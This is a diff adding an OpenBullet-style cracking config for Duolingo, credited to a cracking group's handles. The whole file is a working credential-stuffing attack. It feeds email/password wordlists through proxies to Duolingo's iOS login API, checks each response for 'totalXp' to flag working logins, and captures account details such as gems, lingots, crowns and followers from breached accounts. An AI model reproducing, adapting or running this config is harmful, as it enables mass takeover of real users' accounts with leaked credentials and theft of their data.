@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Duolingo✅ @MADD_CKR [#CKR_TM",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-30T12:12:56.5574097+00:00",
+  "AdditionalInfo": "",
+  "Author": "@CONFIGS_MADD",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#MADD_V1 REQUEST POST "https://ios-api-2.duolingo.com/2017-06-30/login" 
+  CONTENT "{\"identifier\":\"<USER>\",\"fields\":\"adsConfig{units,allowPersonalizedAds},betaStatus,bio,blockedUserIds,blockerUserIds,coachOutfit,courses{authorId,crowns,extraCrowns,healthEnabled,fromLanguage,id,learningLanguage,placementTestAvailable,title,xp},creationDate,currencyRewardBundles,currentCourse{authorId,checkpointTests,healthEnabled,extraCrowns,fluency,fromLanguage,id,learningLanguage,managedInHouse,placementTestAvailable,progressQuizHistory,progressVersion,skills{accessible,bonus,grammar,decayed,explanation,finishedLessons,finishedLevels,hasLevelReview,iconId,id,indicatingNewContent,lastLessonPerfect,lessons,levels,name,progressRemaining,shortName,urlName,finalLevelTimeLimit},sections,smartTips,status,title,trackingProperties,xp,numberOfWords,numberOfSentences,ttsAccents,storiesTabPromotionLocation},email,emailAnnouncement,emailPromotion,emailFollow,emailPass,emailStreakFreezeUsed,enableMicrophone,enableSoundEffects,enableSpeaker,experiments{opmar_ios_apple_and_social_signin,china_show_privacy_accept_page,china_ios_show_privacy_checkbox,midas_ios_family_promo_profile_plus,connect_leaderboard_reactions_holdout,midas_ios_settings_plus_hook,ios_flashcards_v4_jazh,connect_ios_fpp_stick_header_v4,midas_direct_purchase_cta,ios_lesson_streak_font_increase,ios_alphabets_he_en,ios_alphabets_yi_en,mercury_ios_acquisition_survey_title_v3,midas_ios_remove_discounted_price_tag,midas_ios_plus_ft_cancellation_notif,retention_ios_mg_compl_detail_v2,sigma_ios_refresh_catalog,ios_flashcards_v4_enzh,stories_ios_intro_callout_tier_1_v2,midas_ios_one_heart_refill,midas_ios_remove_pronun_review_2,news_ios_spanish_ui_2,ios_custom_share_sheet_streak_society,midas_ios_always_interstitial,retention_ios_mg_empty_state,midas_ios_plus_ad_backup_on_rv_error,stories_ios_tab_promotion,ios_install_keyboard_notification,midas_ios_contextual_checklists_2,ios_should_request_all_experiments,connect_ios_share_profile,ios_swift_skill_tree,midas_ios_att_show_home_alert_2,courses_it_de_v1,artemis_ios_limit_session_start_rv,midas_ios_family_onboarding_invitation,china_ios_share_streak_v8,audiolessons_priming_disable,midas_ios_remove_mq_drawer_plus,poseidon_ios_hard_mode_on_demand_1,midas_ios_seven_day_ft_2021,poseidon_ios_selectable_timer_boosts_pp,retention_ios_mg_se_cadence_v1,tsl_ios_daily_goal_boost,tsl_ios_expand_achievements,tsl_ios_relax_league_increase,midas_ios_family_promo_se_free_1,ios_birdhouse_mvp_3,sigma_ios_legendary_crown_drawer,midas_ios_parallax_stars_2,midas_ios_plus_rv_first_3,sigma_ios_animated_legendary_ui,retention_ios_words_duo_CTA_delay,ios_suggestion_bar_en_from_es_pt,connect_ios_fpp_redesign_ipad,ios_flashcards_v2_fren,connect_ios_extend_profile_completion,midas_ios_give_reward_on_rv_error,midas_ios_plus_interstitial_se_cta,midas_ios_stories_gems_pacing_1,stories_ios_speak_mode_improvements,speak_ios_repertoire_skills_speak_on_dr,connect_ios_phone_number_fakedoor,ios_suggestion_bar_es,connect_ios_dismiss_suggestions,nurr_ios_self_evaluated_placement_v2,speak_ios_tap_output_fmt,audiolessons_new_backend_v2,china_zh-HK_zh-CN_v1,midas_ios_idfa_apple_prompt_2,midas_ios_purchase_page_progress_bar,sigma_ios_legendary_toggle_gems_price,artemis_ios_plus_after_course_slxn_2,nurr_ios_0_skill_place_out_streak,sigma_ios_legendary_crack_v3,midas_ios_idfa_optin_registration_2,sigma_ios_mistakes_practice_fab_2,stories_ios_label_new_published_stories,media_ios_stories_illustration,learning_ios_duolingo_score_range_v2,midas_ios_timer_boost_perk,connect_ios_referral_tiered_rewards,midas_ios_family_promo_shop_plus,ios_delight_remove_owlfits,ios_crashlytics_nonfatals,poseidon_ios_ramp_up_fab_redesign_v2,poseidon_ios_timer_boosts_with_gems,midas_ios_new_plus_interstitial,midas_ios_plus_rv_cta,stories_ios_hint_onboarding,midas_ios_mistakes_inbox_se_cards_2,midas_ios_family_required_spotlight,stories_ios_session_end_loading_dots,sigma_ios_mistakes_pronounciation,tsl_ios_rename_demotion_promotion_zones,audiolessons_on_ipad,poseidon_ios_ramp_up_se_promo_v2,artemis_ios_pq_prompt_migration,audiolessons_set_placement_v2,connect_ios_compare_contacts,speak_grader_highlight_skipped_words,ios_session_end_messaging_backend_v2,china_ios_cantonese_drawer,midas_ios_plus_onboarding_notif_slide,ios_flashcards_enzh_tree2,poseidon_ios_ramp_up_homepage,poseidon_ios_rebalance_gem_sources,midas_ios_idfa_session_end_2,sigma_ios_mistakes_xp_boost,poseidon_ios_fixed_ramp_up_v1_title,stories_ios_carousel,tsl_ios_achievements_autoscroll,china_ios_share_streak_v6,connect_ios_contact_sync_permission,slab_ios_lss_pt_en,artemis_ios_payments_disabled,nurr_ios_delay_adaptive_challenges,connect_ios_connect_contacts_v2,midas_ios_split_purchase_page,midas_ios_timeline_remove_monthly,midas_ios_stories_interstitials,nurr_ios_turn_up_volume_placementtestV2,poseidon_ios_streak_freeze_offer_iap,audiolessons_ios_tab_swap_v1,china_words_list_kill_v2,retention_ios_animated_streak_se_v2,audiolessons_remove_incorrect_feedback,learning_ios_autoscroll_tree_v2,connect_ios_xp_graph_toggle,media_ios_al_lsre,opmar_ios_registration_wall_lb_v2,poseidon_ios_streak_repair_gem_iap,sigma_ios_legendary_session_end_promo,slab_ios_lss_de_en,ios_flashcards_v4_fren,audiolessons_sound_effect_fix,china_ios_plus_registration_hook_2,midas_ios_zero_members_badge,stories_ios_label_unlocked_stories,midas_ios_new_plus_rv,audiolessons_ads,slab_ios_lss_translate,ios_screenshot_share,sigma_ios_legendary_skill_progress,courses_fr_ja_v1,sigma_ios_remove_offline_plus_users,ios_delight_schools_promo_session_end,ios_user_active_testing,slab_ios_lss_es_en,ios_delight_standardize_timer_fmts,ios_fullstory_recording_v3,ios_session_end_card_pt_to_en_podcast,midas_ios_plus_fab_add_label,connect_ios_kudos_new_tag,poseidon_ios_hard_mode_gems_1,midas_ios_no_notif_cancel_page_reminder,retention_ios_mg_tiered_goals,opmar_ios_registration_wall_profile_v2,tsl_stories_unlock_cta,retention_ios_new_se_anim_v1,audiolessons_ios_podcast_v1,ios_alphabets_hi_en,poseidon_ios_increase_gem_iap_quantity,midas_ios_timeline_purchase_string,slab_ios_lss_it_en,ios_delight_sound_fx_learning_app_v3,midas_ios_family_promo_shop_free,artemis_ios_pre_lesson_plus_ad,ios_flashcards_v2_enzh,sigma_ios_legendary_40_xp,ios_frame_rate_performance,midas_ios_reg_checklist_no_animation,events_allow_ios_checkins,retention_ios_monthly_goals_v2,nurr_ios_vocab_placement,tsl_ios_xp_boost_fabless,hoots_ios,midas_ios_family_promo_plus_dashboard,connect_ios_universal_kudos,midas_ios_family_promo_profile_free_1,sigma_ios_legendary_bonus_grammar,speak_tts_rec_aug_v1,tsl_ios_next_lesson_v2,retention_ios_use_timeline_resurrected,sigma_ios_hearts_drawer_redesign_2,hacker_ios_match_sparkles,poseidon_ios_ramp_up_session_type,midas_ios_idfa_show_home_and_SE,midas_ios_plus_ad_as_backup_v3,nurr_ios_turn_up_volume_speaker_tapV2,sigma_ios_use_plus_status,stories_ios_homepage_redesign_v2,speak_Immediately_grade_fully_correct,globalization_streak_freeze_notify,retention_ios_sf_gift_copy_v1,opmar_jp_tips,midas_test_outs_paywall_copy,opmar_pt_email_copy_v1,globalization_home_notifications,opmar_jp_placement_v1,retention_ios_wager_copy_v1,globalization_fr_onboard_notify,retention_ios_repair_no_thanks,retention_ios_streak_se_explainer_v2,opmar_midlesson_motivation_one,globalization__fr_leaderboard_notify,china_ios_plus_checklist_string_2106,retention_ios_repair_title_copy,china_ios_tips_string_2107,opmar_midlesson_motivation_two,retention_ios_goals_fab_section_titles,retention_capstone_xp_boost_copy_v1},facebookId,feedbackProperties,fromLanguage,gems,gemsConfig,globalAmbassadorStatus,googleId,hasRecentActivity15,health,id,inviteURL,joinedClassroomIds,kudosOffers,kudosReceived,learningLanguage,lingots,location,monthlyXp,motivation,name,observedClassroomIds,optionalFeatures,persistentNotifications,phoneNumber,picture,plusDiscounts,plusStatus,practiceReminderSettings,privacySettings,profileCountry,pushAnnouncement,pushFollow,pushPassed,pushLeaderboards,pushPromotion,pushStreakFreezeUsed,pushStreakSaver,requiresParentalConsent,referralInfo,roles,shakeToReportEnabled,shopItems{id,purchaseDate,purchasePrice,quantity,subscriptionInfo{expectedExpiration,isFreeTrialPeriod,isInBillingRetryPeriod,productId,renewer,renewing,tier},familyPlanInfo{ownerId,secondaryMembers,inviteToken},wagerDay},stateNeedsTOS,streakData,timerBoostConfig,timezone,timezoneOffset,totalXp,trackingProperties,username,weeklyXp,xpConfig,xpGains{time, xp,skillId,eventType},zhTw,subscriptionConfigs\",\"password\":\"<PASS>\",\"distinctId\":\"<id>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": authority: ios-api-2.duolingo.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip;q=1.0,compress;q=0.5" 
+  HEADER "accept-language: en-US;q=1.0" 
+  HEADER "content-length: 8513" 
+  HEADER "content-type: application/json" 
+  HEADER "user-agent: DuolingoMobile/6.129.0 (iPhone; iOS 14.4; Scale/3.00)" 
+  HEADER "x-amzn-trace-id: User=0" 
+
+#MADD_V2 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{}" 
+  KEYCHAIN Success OR 
+    KEY "totalXp" 
+
+#MADD_V3 PARSE "<SOURCE>" JSON "num_followers" CreateEmpty=FALSE -> CAP "Followers✅" 
+
+#MADD_V4 PARSE "<SOURCE>" JSON "total_crowns" CreateEmpty=FALSE -> CAP "Crowns" 
+
+#MADD_V5 PARSE "<SOURCE>" JSON "lingots" CreateEmpty=FALSE -> CAP "Lingots " 
+
+#MADD_V6 PARSE "<SOURCE>" JSON "totalXp" CreateEmpty=FALSE -> CAP "Total XP☑️" 
+
+#MADD_V7 PARSE "<SOURCE>" JSON "gems" CreateEmpty=FALSE -> CAP "Gems " 
+
+#CRÉDIT_❤️☑️ FUNCTION Constant "@MADD_CKR [#CKR_TM]" -> VAR "Config By <THE BEST>" 
+
